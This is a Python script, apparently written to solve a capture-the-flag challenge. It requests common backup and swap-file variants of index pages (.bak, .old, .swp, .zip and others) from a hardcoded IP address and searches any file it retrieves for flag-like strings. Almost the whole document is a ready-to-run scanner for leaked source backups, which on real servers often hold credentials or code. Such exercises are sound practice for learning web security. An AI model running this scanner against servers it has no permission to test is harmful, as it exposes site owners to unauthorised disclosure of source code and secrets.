import requests
import re
import sys

# Define the target URL and common backup extensions
TARGET_URL = "http://136.110.49.76/"

# List of common backup/old/temporary extensions for index files
BACKUP_EXTENSIONS = [
    ".bak",         # Backup file
    ".old",         # Old version file
    ".orig",        # Original file
    "~",            # Vim/Emacs backup file
    ".swp",         # Vim swap file (often requires checking for dot prefix)
    ".backup",
    ".bck",
    ".zip",         # Compressed archive
]

# Possible base names for the index file
POSSIBLE_INDEX_FILES = [
    "index.php",
    "index.html",
    "index.htm",
    "index",
]

# Max size to check content to prevent memory overload from huge files
MAX_CONTENT_SIZE = 10000 


def find_backup_files():
    """
    Constructs and tests URLs for all possible backup files.
    """
    print(f"[*] Starting scan for backup files at: {TARGET_URL}\n")
    
    for base_file in POSSIBLE_INDEX_FILES:
        for ext in BACKUP_EXTENSIONS:
            # Construct the base URL
            backup_url = f"{TARGET_URL}{base_file}{ext}"
            
            # Special handling for Vim swap files, which usually have a dot prefix
            if ext == ".swp":
                 # Example: http://target/.index.php.swp
                backup_url = f"{TARGET_URL}.{base_file}{ext}"


            try:
                # Send HTTP GET Request to the URL
                response = requests.get(backup_url, timeout=5)
                
                # Check HTTP Status Code 
                # (200 OK means the file was found and is accessible)
                if response.status_code == 200:
                    print(f"[+] Found accessible backup file: **{backup_url}**")
                    
                    # Check file size before scanning the content
                    if len(response.text) < MAX_CONTENT_SIZE:
                        find_flag_in_content(response.text, backup_url)
                    else:
                        print(f"    [!] File is too large ({len(response.text)} bytes). Skipping flag scan.")
                        
                # Only print non-200 and non-404 status codes
                elif response.status_code != 404:
                    print(f"[*] Checking {backup_url} -> Status: {response.status_code}")

            except requests.exceptions.RequestException as e:
                # Handle connection errors (e.g., Timeout, DNS error)
                print(f"[-] Connection error for {backup_url}: {e}")
                
    print("\n[*] Scan complete.")


def find_flag_in_content(content, url):
    """
    Searches for a string that looks like a Flag within the received content.
    """
    # Flexible Regex for common flag formats (e.g., flag{...}, FLAG{...}, 32-char strings)
    # The 're.DOTALL' flag allows '.' to match newlines
    flag_pattern = r"([fF][lL][aA][gG]\{.*?\})|([A-Za-z0-9]{32,})"
    
    # Search the entire content
    matches = re.findall(flag_pattern, content, re.DOTALL)
    
    if matches:
        print("\n\t **FLAG FOUND!**")
        for match in matches:
            # Due to multiple groups in the regex, filter for the non-empty match
            actual_flag = next((f for f in match if f), None) 
            if actual_flag:
                print(f"\t---------------------------------------------------")
                print(f"\t[RESULT] **{actual_flag}**")
                print(f"\t[SOURCE] {url}")
                print(f"\t---------------------------------------------------")
                # Optional: Stop execution after finding the first flag
                # sys.exit(0) 
    else:
        print("\t[i] No flag-like string found in content.")


if __name__ == "__main__":
    # Check if requests library is available
    try:
        import requests
    except ImportError:
        print("Error: The 'requests' library is not installed.")
        print("Please run: pip install requests")
        sys.exit(1)
        
    find_backup_files()
